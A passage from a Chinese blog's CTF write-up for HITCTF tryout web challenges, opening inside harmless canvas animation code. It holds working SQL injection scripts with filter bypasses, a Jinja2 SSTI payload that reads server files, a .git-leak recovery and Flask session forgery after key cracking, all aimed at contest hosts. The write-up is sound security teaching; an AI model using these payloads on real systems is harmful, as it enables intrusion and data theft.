class="hljs-string">&quot;rgba(&quot;</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">125</span> + <span class="hljs-number">130</span>) + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">125</span> + <span class="hljs-number">130</span>) + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">parseInt</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">125</span> + <span class="hljs-number">130</span>) + <span class="hljs-string">&quot; , 1)&quot;</span>;</span><br><span class="language-javascript">                    context.<span class="hljs-title function_">fillText</span>(code, canvas.<span class="hljs-property">width</span> / <span class="hljs-number">2</span> - ((text.<span class="hljs-property">length</span> / <span class="hljs-number">2</span> - i) * <span class="hljs-number">150</span>), canvas.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>);</span><br><span class="language-javascript">                    context.<span class="hljs-title function_">restore</span>();</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                dots = <span class="hljs-title function_">getimgData</span>();</span><br><span class="language-javascript">                <span class="hljs-title function_">initAnimate</span>();</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            index &lt; (ele.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) ? index++ : index = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">imgload</span>(<span class="hljs-params">img, callback</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (img.<span class="hljs-property">complete</span>) &#123;</span><br><span class="language-javascript">                callback.<span class="hljs-title function_">call</span>(img);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                img.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    callback.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> lastTime;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">initAnimate</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            dots.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = <span class="hljs-title function_">getRandom</span>(<span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = <span class="hljs-title function_">getRandom</span>(<span class="hljs-number">0</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">z</span> = <span class="hljs-title function_">getRandom</span>(-focallength, focallength);</span><br><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">tx</span> = <span class="hljs-title function_">getRandom</span>(<span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">ty</span> = <span class="hljs-title function_">getRandom</span>(<span class="hljs-number">0</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">tz</span> = <span class="hljs-title function_">getRandom</span>(-focallength, focallength);</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            dots.<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> b.<span class="hljs-property">z</span> - a.<span class="hljs-property">z</span>;</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            dots.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">paint</span>();</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            lastTime = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();</span><br><span class="language-javascript">            <span class="hljs-title function_">animate</span>();</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> derection = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            animateRunning = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> thisTime = +<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();</span><br><span class="language-javascript">            context.<span class="hljs-title function_">save</span>();</span><br><span class="language-javascript">            context.<span class="hljs-property">globalCompositeOperation</span> = <span class="hljs-string">&#x27;destination-out&#x27;</span>;</span><br><span class="language-javascript">            context.<span class="hljs-property">globalAlpha</span> = <span class="hljs-number">0.1</span>;</span><br><span class="language-javascript">            context.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">            context.<span class="hljs-title function_">restore</span>();</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> sulv = <span class="hljs-number">0.1</span>;</span><br><span class="language-javascript">            dots.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> dot = <span class="hljs-variable language_">this</span>;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (derection) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(dot.<span class="hljs-property">dx</span> - dot.<span class="hljs-property">x</span>) &lt; <span class="hljs-number">0.1</span> &amp;&amp; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(dot.<span class="hljs-property">dy</span> - dot.<span class="hljs-property">y</span>) &lt; <span class="hljs-number">0.1</span> &amp;&amp; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(dot.<span class="hljs-property">dz</span> - dot.<span class="hljs-property">z</span>) &lt; <span class="hljs-number">0.1</span>) &#123;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">x</span> = dot.<span class="hljs-property">dx</span>;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">y</span> = dot.<span class="hljs-property">dy</span>;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">z</span> = dot.<span class="hljs-property">dz</span>;</span><br><span class="language-javascript">                        <span class="hljs-keyword">if</span> (thisTime - lastTime &gt; <span class="hljs-number">300</span>) derection = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">                    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">x</span> = dot.<span class="hljs-property">x</span> + (dot.<span class="hljs-property">dx</span> - dot.<span class="hljs-property">x</span>) * sulv;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">y</span> = dot.<span class="hljs-property">y</span> + (dot.<span class="hljs-property">dy</span> - dot.<span class="hljs-property">y</span>) * sulv;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">z</span> = dot.<span class="hljs-property">z</span> + (dot.<span class="hljs-property">dz</span> - dot.<span class="hljs-property">z</span>) * sulv;</span><br><span class="language-javascript">                        lastTime = +<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(dot.<span class="hljs-property">tx</span> - dot.<span class="hljs-property">x</span>) &lt; <span class="hljs-number">0.1</span> &amp;&amp; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(dot.<span class="hljs-property">ty</span> - dot.<span class="hljs-property">y</span>) &lt; <span class="hljs-number">0.1</span> &amp;&amp; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(dot.<span class="hljs-property">tz</span> - dot.<span class="hljs-property">z</span>) &lt; <span class="hljs-number">0.1</span>) &#123;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">x</span> = dot.<span class="hljs-property">tx</span>;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">y</span> = dot.<span class="hljs-property">ty</span>;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">z</span> = dot.<span class="hljs-property">tz</span>;</span><br><span class="language-javascript">                        pause = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">                    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">x</span> = dot.<span class="hljs-property">x</span> + (dot.<span class="hljs-property">tx</span> - dot.<span class="hljs-property">x</span>) * sulv;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">y</span> = dot.<span class="hljs-property">y</span> + (dot.<span class="hljs-property">ty</span> - dot.<span class="hljs-property">y</span>) * sulv;</span><br><span class="language-javascript">                        dot.<span class="hljs-property">z</span> = dot.<span class="hljs-property">z</span> + (dot.<span class="hljs-property">tz</span> - dot.<span class="hljs-property">z</span>) * sulv;</span><br><span class="language-javascript">                        pause = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            dots.<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> b.<span class="hljs-property">z</span> - a.<span class="hljs-property">z</span>;</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            dots.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">paint</span>();</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (!pause)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">RAF</span>(animate)</span><br><span class="language-javascript">            &#125;<span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                context.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">                <span class="hljs-title function_">eachEle</span>();</span><br><span class="language-javascript">                derection = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">                pause = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">getRandom</span>(<span class="hljs-params">a, b</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (b - a) + a</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">getimgData</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> imgData = context.<span class="hljs-title function_">getImageData</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">            context.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> dots = [];</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> canbreak = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>; x &lt; imgData.<span class="hljs-property">width</span>; x += dr) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> y = <span class="hljs-number">0</span>; y &lt; imgData.<span class="hljs-property">height</span>; y += dr) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">var</span> i = (y * imgData.<span class="hljs-property">width</span> + x) * <span class="hljs-number">4</span>;</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (imgData.<span class="hljs-property">data</span>[i + <span class="hljs-number">3</span>] &gt; <span class="hljs-number">128</span>) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">var</span> dot = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dot</span>(x - dr, y - dr, <span class="hljs-number">0</span>, dr, &#123;</span><br><span class="language-javascript">                            <span class="hljs-attr">a</span>: imgData.<span class="hljs-property">data</span>[i],</span><br><span class="language-javascript">                            <span class="hljs-attr">b</span>: imgData.<span class="hljs-property">data</span>[i + <span class="hljs-number">1</span>],</span><br><span class="language-javascript">                            <span class="hljs-attr">c</span>: imgData.<span class="hljs-property">data</span>[i + <span class="hljs-number">2</span>]</span><br><span class="language-javascript">                        &#125;);</span><br><span class="language-javascript">                        dots.<span class="hljs-title function_">push</span>(dot);</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dots.<span class="hljs-property">length</span>)</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> dots;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;())</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>以后也能用这么炫酷的特效了哈哈。</p><h2 id="赛博音乐会"><a class="markdownIt-Anchor" href="#赛博音乐会"></a> 赛博音乐会</h2><p><img src="https://upyun.wuuconix.link/image-20210912162340832.png" alt="题目" /></p><p>题目界面同样十分精美，查看源代码后发现图片的链接用的是一个php文件。</p><p><img src="https://upyun.wuuconix.link/image-20210912162450439.png" alt="img" /></p><p>把后面的链接直接改成flag.txt即可获得flag。</p><p><img src="https://upyun.wuuconix.link/image-20210912162513480.png" alt="ctf" /></p><h2 id="消失的源码"><a class="markdownIt-Anchor" href="#消失的源码"></a> 消失的源码</h2><p>dirsearch发现<code>.git</code>文件泄露。</p><p><img src="https://upyun.wuuconix.link/image-20210912162642072.png" alt="dirsearch" /></p><p>利用<code>GitHack</code>脚本即可获得网站源代码。</p><p><img src="https://upyun.wuuconix.link/image-20210912162837794.png" alt="githack" /></p><p>源码中没有flag，考虑flag在git以前的版本中，利用<code>git log</code>查看历史版本。</p><p><img src="https://upyun.wuuconix.link/image-20210912162953972.png" alt="git log" /></p><p>利用<code>git reset -a comit-id</code>回到之前的版本。</p><p><img src="https://upyun.wuuconix.link/image-20210912163138070.png" alt="git reset" /></p><p>获得提示图片。</p><p><img src="https://upyun.wuuconix.link/image-20210912163208051.png" alt="chat" /></p><p>我们了解到flag在目录下<code>oh_my_flag_****.png</code>的图片中，直接用Burp爆破即可。</p><p><img src="https://upyun.wuuconix.link/image-20210912163620979.png" alt="7352" /></p><h2 id="图书馆"><a class="markdownIt-Anchor" href="#图书馆"></a> 图书馆</h2><p>一道常规的sql注入题目，过滤了空格和一些关键字，空格可以用<code>/**/</code>绕过，关键字可以大写绕过。</p><p>以下是自己写的fuzz脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dict.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = f.readline().strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span>:<br>            burp0_url = <span class="hljs-string">f&quot;http://node1.web.tryout.hitctf.cn:20081/read.php?id=<span class="hljs-subst">&#123;quote(<span class="hljs-built_in">id</span>)&#125;</span>&quot;</span><br>            burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>            response = requests.get(burp0_url, headers=burp0_headers).text<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;自首&quot;</span> <span class="hljs-keyword">in</span> response):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>  no&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>  ok&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210912180039047.png" alt="fuzz result" /></p><p>以下为payload脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 order by 3&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>) <span class="hljs-comment">#3无结果，说明主select有两个变量</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;-1 Union Select 1, database()&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>) <span class="hljs-comment">#得到数据库为lilac</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;-1 Union Select 1, Group_concat(table_name) From information_schema.tables Where table_schema = &#x27;lilac&#x27;&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>) <span class="hljs-comment">#得到表here_is_flag_37bdcb5cca88</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;-1 Union Select 1, Group_concat(column_name) From information_schema.columns Where table_name = &#x27;here_is_flag_37bdcb5cca88&#x27;&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>) <span class="hljs-comment">#得到十个字段col_1到col_10</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>): <span class="hljs-comment">#爆破十个字段</span><br>    <span class="hljs-built_in">id</span> = <span class="hljs-string">f&quot;-1 Union Select 1, col_<span class="hljs-subst">&#123;i&#125;</span> From here_is_flag_37bdcb5cca88&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<br>    burp0_url = <span class="hljs-string">f&quot;http://node1.web.tryout.hitctf.cn:20081/read.php?id=<span class="hljs-subst">&#123;quote(<span class="hljs-built_in">id</span>)&#125;</span>&quot;</span><br>    burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>    response = requests.get(burp0_url, headers=burp0_headers).text<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> response):<br>        soup = BeautifulSoup(response, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;col_<span class="hljs-subst">&#123;i&#125;</span> success&quot;</span>)<br>        <span class="hljs-built_in">print</span>(soup.div)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;col_<span class="hljs-subst">&#123;i&#125;</span> failed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210912180128928.png" alt="ctf" /></p><h2 id="统一身份认证"><a class="markdownIt-Anchor" href="#统一身份认证"></a> 统一身份认证</h2><p>题目给了一堆Hint233，几乎就是要把答案给你了，考点就是python flask jinja2 的 ssti。回显藏得比较深，但是题目给了提示，在title标签中。</p><p><img src="https://upyun.wuuconix.link/image-20210912133844783.png" alt="title ssti" /></p><p>试了一下网上的payload，发现很多多会返回500状态码，后来意识到是引号被过滤了，用request请求加参数的方式绕过。</p><p>以下为payload脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-comment"># payload = &quot;&#123;&#123;1 * 100&#125;&#125;&quot;</span><br>payload = <span class="hljs-string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&quot;</span><br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-string">&#x27;arg1&#x27;</span>: <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;arg2&#x27;</span>: <span class="hljs-string">&#x27;/flag.txt&#x27;</span>&#125;<br>burp0_url = <span class="hljs-string">f&quot;http://node1.web.tryout.hitctf.cn:20021/<span class="hljs-subst">&#123;quote(payload)&#125;</span>&quot;</span><br>response = requests.get(burp0_url, params=<span class="hljs-built_in">dict</span>).text<br>soup = BeautifulSoup(response, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-built_in">print</span>(soup.title)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210912133738088.png" alt="ctf" /></p><h2 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> Cookie</h2><p>先随便用一个账号密码进去。</p><p><img src="https://upyun.wuuconix.link/image-20210912144129007.png" alt="页面提示" /></p><p><img src="https://upyun.wuuconix.link/image-20210912145125492.png" alt="cookie" /></p><p>发现Cookie中有username字段，改为admin即可获得flag。</p><p><img src="https://upyun.wuuconix.link/image-20210912145156140.png" alt="ctf" /></p><h2 id="unsign"><a class="markdownIt-Anchor" href="#unsign"></a> Unsign</h2><p>和上一题几乎是同样的题目，只不过抓包后Cookie中没有username字段了，只有一个session。</p><p><img src="https://upyun.wuuconix.link/image-20210912144330117.png" alt="session" /></p><p>看session的样式感觉应该是 flask 的 session。利用<a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager</a> 即可获得session解密后的内容。</p><p><img src="https://upyun.wuuconix.link/image-20210912144536083.png" alt="解密" /></p><p>我们可以看到session解密后里面有username字段，看来需要我们伪造session了。</p><p>但是session是需要有签名的，也就是需要一个<code>SECRET_KEY</code>。但是这道题里没有给。</p><p>这时候其实题目已经提示我们了，我们需要<code>unsign</code>，即根据session来猜测签名。在 github上找到同名脚本 <a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis/Flask-Unsign)</a>。</p><p><img src="https://upyun.wuuconix.link/image-20210912144827845.png" alt="get key" /></p><p>成功得到<code>secret key</code>为<code>password</code>，于是我们再用之前的脚本加密一下即可获得payload。</p><p><img src="https://upyun.wuuconix.link/image-20210912144938395.png" alt="-s 'password'" /></p><p>发送后成功得到flag。</p><p><img src="https://upyun.wuuconix.link/image-20210912145021019.png" alt="ctf" /></p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>本部的题目质量都好高啊，特别是阮学长出的题，界面十分美观。</p><p>但是还是太菜2333，Basic题有4道做不出来了，Advanced题更是看一眼就感觉不会了哈哈。</p><p><img src="https://upyun.wuuconix.link/image-20210912195943465.png" alt="题们" /></p><p><img src="https://upyun.wuuconix.link/image-20210912195751924.png" alt="Scoreboard" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小米路由器4A 刷入 Breed 与 Padavan</title>
    <link href="/2021/09/08/padavan/"/>
    <url>/2021/09/08/padavan/</url>
    
